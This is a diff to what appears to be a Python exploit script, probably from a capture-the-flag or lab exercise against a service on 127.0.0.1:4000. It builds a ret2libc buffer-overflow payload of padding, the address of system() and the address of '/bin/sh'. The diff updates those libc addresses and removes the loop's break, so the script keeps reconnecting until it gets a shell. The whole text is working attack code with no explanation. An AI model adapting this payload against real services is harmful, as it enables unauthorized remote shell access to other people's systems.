@@ -22,9 +22,9 @@ def interact(s):
 
 # Injection Code
 payload = b'A' * 51
-payload += p(0xf7634e70) # system
+payload += p(0xf75e2e70) # system
 payload += b'BBBB'
-payload += p(0xf7754fcc) # /bin/sh
+payload += p(0xf7702fcc) # /bin/sh
 
 while True:
     s = connect('127.0.0.1', 4000)
@@ -37,4 +37,3 @@ while True:
     result = s.recv(1024).decode('utf-8')
     if len(result) > 0:
         print(result)
-    break
